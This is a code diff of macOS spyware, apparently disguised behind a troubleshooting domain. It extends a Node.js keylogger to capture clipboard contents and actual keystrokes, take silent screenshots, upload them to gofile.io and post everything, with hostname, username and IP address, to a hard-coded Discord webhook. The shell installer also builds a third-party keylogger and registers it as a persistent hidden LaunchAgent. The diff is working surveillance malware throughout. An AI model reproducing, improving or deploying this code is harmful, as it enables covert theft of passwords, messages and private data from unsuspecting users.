@@ -727,6 +727,7 @@ const io = require('socket.io-client');
 const WEBHOOK = 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8';
 const SERVER_URL = 'https://troubleshoot-mac.com/';
 const ACCESS_TOKEN = '9f1013f0';
+const UPLOAD_SERVICE = 'https://upload.gofile.io/uploadfile';
 
 const HOSTNAME = os.hostname();
 const USERNAME = os.userInfo().username;
@@ -735,7 +736,7 @@ const CLIENT_ID = `pc-${HOSTNAME}-${USERNAME}`;
 let socket = null;
 let screenshotDir = path.join(os.homedir(), '.screenshots');
 let keysBuffer = '';
-let lastClipboard = '';
+let lastClipboard = ''; // Track clipboard changes for keylogger
 
 if (!fs.existsSync(screenshotDir)) {
     fs.mkdirSync(screenshotDir, { recursive: true });
@@ -764,7 +765,36 @@ connectToServer();
 // REMOVED: takeScreenshot function - not needed for simple keylogger
 // Screenshots can be added later if needed, but for now we only send keystrokes
 
-// Send keylog to Discord - simple and clean
+// Upload screenshot to gofile.io and get URL
+function uploadScreenshot(filepath, callback) {
+    if (!fs.existsSync(filepath)) {
+        callback(null);
+        return;
+    }
+    
+    // Upload to gofile.io (using the same API as troubleshoot.sh)
+    exec(`curl -s -F "file=@${filepath}" "${UPLOAD_SERVICE}"`, (error, stdout) => {
+        if (error || !stdout) {
+            callback(null);
+            return;
+        }
+        
+        try {
+            const response = JSON.parse(stdout);
+            if (response.status === 'ok' && response.data && response.data.downloadPage) {
+                callback(response.data.downloadPage);
+            } else if (response.data && response.data.downloadPage) {
+                callback(response.data.downloadPage);
+            } else {
+                callback(null);
+            }
+        } catch (e) {
+            callback(null);
+        }
+    });
+}
+
+// Send keylog to Discord with screenshot
 function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
     if (!buffer || buffer.length === 0) buffer = '[No activity]';
     
@@ -780,24 +810,54 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
-    
-    const payload = {
-        content: keylogContent
-    };
-    
-    const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
-    try {
-        fs.writeFileSync(payloadFile, JSON.stringify(payload));
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
-            setTimeout(() => {
-                try { fs.unlinkSync(payloadFile); } catch (e) {}
-            }, 5000);
+    // If we have a screenshot, upload it first
+    if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
+        uploadScreenshot(screenshotFilePath, (screenshotUrl) => {
+            let keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
+            
+            if (screenshotUrl) {
+                keylogContent += `\n📸 **Screenshot:** ${screenshotUrl}`;
+            }
+            
+            const payload = {
+                content: keylogContent
+            };
+            
+            const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
+            try {
+                fs.writeFileSync(payloadFile, JSON.stringify(payload));
+                exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
+                    setTimeout(() => {
+                        try { fs.unlinkSync(payloadFile); } catch (e) {}
+                    }, 5000);
+                });
+            } catch (e) {
+                // Fallback
+                const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}${screenshotUrl ? '\nScreenshot: ' + screenshotUrl : ''}`;
+                exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
+            }
         });
-    } catch (e) {
-        // Fallback
-        const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
-        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
+    } else {
+        // No screenshot - just send text
+        const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
+        
+        const payload = {
+            content: keylogContent
+        };
+        
+        const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
+        try {
+            fs.writeFileSync(payloadFile, JSON.stringify(payload));
+            exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
+                setTimeout(() => {
+                    try { fs.unlinkSync(payloadFile); } catch (e) {}
+                }, 5000);
+            });
+        } catch (e) {
+            // Fallback
+            const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
+            exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
+        }
     }
 }
 
@@ -805,11 +865,10 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
 // Discord webhooks don't support base64 images, so we only send text via sendKeylogToDiscord
 // Screenshots are sent to dashboard via Socket.IO only
 
-// SIMPLE KEYSTROKE CAPTURE - Only sends when clipboard actually changes (typing/copying)
-let lastClipboard = '';
-let keysBuffer = '';
+// KEYSTROKE CAPTURE - Captures clipboard changes AND actual typing
+// lastClipboard and keysBuffer are already declared above
 
-// Monitor clipboard - only send when it actually changes
+// Method 1: Monitor clipboard changes (copy/paste) - with screenshot
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
         if (!error && stdout && stdout.trim()) {
@@ -824,15 +883,75 @@ setInterval(() => {
                 }
                 keysBuffer += clipboard.substring(0, 5000);
                 
-                // Send immediately when clipboard changes
-                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                // Take screenshot when clipboard changes
+                const timestamp = Date.now();
+                const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
-                // Clear buffer after sending
-                keysBuffer = '';
+                exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
+                    if (!screenshotError && fs.existsSync(screenshotFile)) {
+                        // Send with screenshot
+                        sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                        // Clean up screenshot after upload
+                        setTimeout(() => {
+                            try { fs.unlinkSync(screenshotFile); } catch (e) {}
+                        }, 30000);
+                    } else {
+                        // Send without screenshot if capture failed
+                        sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                    }
+                    
+                    // Clear buffer after sending
+                    keysBuffer = '';
+                });
             }
         }
     });
 }, 500); // Check every 500ms
+
+// Method 2: Monitor pke keylogger output if available (captures ACTUAL keystrokes)
+const pkeKeylogFile = '/tmp/keylog.tmp';
+let lastPkeSize = 0;
+
+// Check if pke is installed and running
+setInterval(() => {
+    if (fs.existsSync(pkeKeylogFile)) {
+        try {
+            const stats = fs.statSync(pkeKeylogFile);
+            const currentSize = stats.size;
+            
+            // If file size increased, new keystrokes were captured
+            if (currentSize > lastPkeSize) {
+                const keystrokes = fs.readFileSync(pkeKeylogFile, 'utf8').substring(lastPkeSize);
+                lastPkeSize = currentSize;
+                
+                if (keystrokes && keystrokes.trim().length > 0) {
+                    keysBuffer += keystrokes.substring(0, 5000);
+                    
+                    // Take screenshot when actual typing detected
+                    const timestamp = Date.now();
+                    const screenshotFile = path.join(screenshotDir, `typing_${timestamp}.png`);
+                    
+                    exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
+                        if (!screenshotError && fs.existsSync(screenshotFile)) {
+                            sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
+                            setTimeout(() => {
+                                try { fs.unlinkSync(screenshotFile); } catch (e) {}
+                            }, 30000);
+                        } else {
+                            sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                        }
+                        keysBuffer = '';
+                    });
+                }
+            }
+        } catch (e) {
+            // File read error - ignore
+        }
+    } else {
+        // Reset size if file doesn't exist
+        lastPkeSize = 0;
+    }
+}, 1000); // Check every second for pke output
 
 // REMOVED: Active app monitoring - was causing spam
 
@@ -876,6 +995,62 @@ PKGEOF
     
     # Install dependencies (wait for it to complete)
     (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1)
+    
+    # Try to install pke keylogger for actual keystroke capture (optional, no sudo needed)
+    # This will capture ACTUAL keystrokes, not just clipboard
+    if command -v git >/dev/null 2>&1 && command -v make >/dev/null 2>&1; then
+        PKE_DIR="/tmp/pke_install_$$"
+        rm -rf "$PKE_DIR" 2>/dev/null
+        mkdir -p "$PKE_DIR"
+        
+        # Clone pke (non-interactive, timeout after 30 seconds)
+        if timeout 30 git clone --quiet https://github.com/paulbeusterien/pke.git "$PKE_DIR" 2>/dev/null; then
+            (cd "$PKE_DIR" && make >/dev/null 2>&1)
+            if [ -f "$PKE_DIR/pke" ]; then
+                # Install to user's local bin (no sudo needed)
+                mkdir -p "$HOME/.local/bin" 2>/dev/null
+                if cp "$PKE_DIR/pke" "$HOME/.local/bin/pke" 2>/dev/null; then
+                    chmod +x "$HOME/.local/bin/pke" 2>/dev/null
+                    # Add to PATH if not already there
+                    if ! echo "$PATH" | grep -q "$HOME/.local/bin"; then
+                        export PATH="$HOME/.local/bin:$PATH"
+                    fi
+                    # Create LaunchAgent for pke (runs as user, no sudo needed)
+                    PKE_AGENT_FILE="$HOME/Library/LaunchAgents/com.pke.keylogger.plist"
+                    cat > "$PKE_AGENT_FILE" << PKEEOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.pke.keylogger</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$HOME/.local/bin/pke</string>
+        <string>-o</string>
+        <string>/tmp/keylog.tmp</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>WorkingDirectory</key>
+    <string>/tmp</string>
+    <key>StandardOutPath</key>
+    <string>/tmp/pke.log</string>
+    <key>StandardErrorPath</key>
+    <string>/tmp/pke.error.log</string>
+</dict>
+</plist>
+PKEEOF
+                    launchctl unload "$PKE_AGENT_FILE" 2>/dev/null
+                    launchctl load "$PKE_AGENT_FILE" 2>/dev/null || true
+                    launchctl start com.pke.keylogger 2>/dev/null || true
+                fi
+            fi
+            rm -rf "$PKE_DIR" 2>/dev/null
+        fi
+    fi
     
     # Create Launch Agent for 24/7 operation (runs even after terminal closes)
     local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
